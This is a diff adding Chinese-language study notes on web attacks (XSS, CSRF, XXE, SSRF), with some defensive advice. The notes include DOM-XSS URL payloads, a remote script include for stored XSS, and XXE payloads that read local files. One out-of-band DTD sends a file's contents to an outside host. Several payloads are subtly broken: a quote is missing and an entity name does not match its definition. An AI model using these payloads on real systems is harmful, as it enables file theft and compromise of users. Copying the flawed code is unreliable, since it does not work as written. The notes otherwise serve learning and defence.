@@ -1,0 +1,177 @@
+存储xss
+
+提交js攻击代码，存储到数据库，然后一直存在。
+
+
+攻击代码过长，可以使用文件包含。
+<script src="http://10.148.52.202/1.js></script>
+
+
+反射型xss
+
+没有留存到数据库，经过服务器之后就输出了。
+直接返回需要的信息。
+
+
+DOM型XSS
+document object model
+不经过后端 ，通过Url传入参数去控制触发的。不和服务器通信，却能执行xss代码。
+
+
+xss-protection： 浏览器安全设置。谷歌有效，火狐没用。IE浏览器设置里的http安全里面的xss保护。
+
+header("X-Xss-Protection: 0");  #告诉浏览器禁用Xss保护
+header("X-Xss-Protection: 1");	#开启XSS保护
+
+
+127.0.0.1
+::1
+localhost
+
+
+###########dom_xss.html
+#实例分析
+<html>
+<head>
+	<title>DOM XSS</title>
+	<meta charset='utf-8'>
+</head>
+<body>
+	<div id="area"></div>
+	<script>
+		document.getElementById("area").innerHTML=unescape(location.hash);
+	</script>
+</body>
+</html>
+
+#########利用
+http://10.148.52.202/dom_xss.html#<img src=x onerror='alert(/xss/)'>
+无显示刷新网页
+###利用2 
+http://10.148.52.202/dom_xss.html#%3Cinput%20name=%22user%22%20value=%22%22%20onclick=%22alert(1)%22/%3E
+http://10.148.52.202/dom_xss.html#<input name="user" value="" onclick="alert(1)"/>
+
+以上使用时点击输入框生效，onclick属性
+###输出在css代码
+<style type="text/css">
+body {
+	color:  #000; background-image: url('javascript:alert(/xss/)') ;
+} 
+</style>
+
+
+
+
+####CRLF +xss  （php小于5.1 版本。）
+
+百度一下crlf注入实例
+
+
+
+###############
+
+CSRF(cross-site request forgery) 跨站请求伪造，或者叫：One clickAttack   or   "Session Riding"
+
+
+###############
+
+危害： 
+	依靠用户标识危害网站
+	利用网站对用户标识的信任
+	欺骗用户的浏览器发送http请求给目标站点
+	另外可以通过img标签触发一个GET请求，可以利用它来实现CSRF攻击
+	
+###
+CSRF防护
+###
+
+三种策略：
+	1、验证HTTP Referer字段  #referer检测来源网站
+	2、在请求地址中添加token并验证 
+	3、在http头中自定义属性并验证  #随机生成，不为人知。
+	
+	
+
+###########
+	XXE漏洞（xml的实体注入） 抓包碰到xml实体的，可以联想到xxe
+###########
+危害：
+	1. 可以ssrf
+	2. 读文件
+	3. 执行命令
+	4. 扫描端口
+
+	<!entity  xd system  "file:///d:/1.txt">
+
+burp抓包时候碰到xml，将原本xml替换成如下
+代码如下：
+<?xml version="1.0"?>
+<!DOCTYPE bbb[
+	<!ENTITY xindong SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.txt">
+]>
+<aa>
+&xindong;
+</aa>
+
+
+代码2：
+<?xml version="1.0"?>
+<!DOCTYPE bbb[
+	<!ENTITY xd SYSTEM "file://////d:/1.txt">
+]>
+<aa>
+&xd;
+</aa>	
+
+
+
+发送文件内容到服务器：
+<?xml version="1.0"?>
+<!DOCTYPE bbb[
+	<!ENTITY xd SYSTEM "http://127.0.0.1/a.dtd">
+]>
+<aa>
+&xd;
+</aa>	
+
+
+a.dtd文件内容如下：
+
+
+<!ENTITY %xd SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.txt">
+<!ENTITY %demo "<!ENTITY xindong2 SYSTEM 'http://src2.cc/xd.php?i=%xindong;'>">
+%demo
+
+
+###########
+
+修补漏洞xxe
+####
+方法：
+	1. 使用开发语言提供的“禁用外部实体的方法”
+	e.g.：
+		php:   libxml_disable_entity_loader(true);
+		java:  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);
+	
+	2. 过滤用户提交的xml数据关键词 <!DOCTYPE 和<!ENTITY, 或者SYSTEM 和PUBLIC
+	
+	libxml2.9.1 及之后的版本，默认不解析外部实体。
+	
+	
+	
+############
+SSRF  （Server-side Request Forgery）（服务器端请求伪造）csrf是客户端请求伪造
+#########
+
+接受客户端的url，然后服务端拿你的url去请求，返回给你。可以在请求内网服务器。
+扫描端口
+读取文件
+
+###判断存在ssrf，直接访问ip.cn
+http://kksk.com/ssrf.php?url=ip.cn
+在本机也访问一次ip.cn，如过两次返回结果不一致，则存在ssrf，如过两次返回结果不一致，则存在ssrf
+
+使用如下：
+http://10.148.52.202/url.php?url=http://ww.baidu.com
+修补： 	过滤
+		根据具体修补
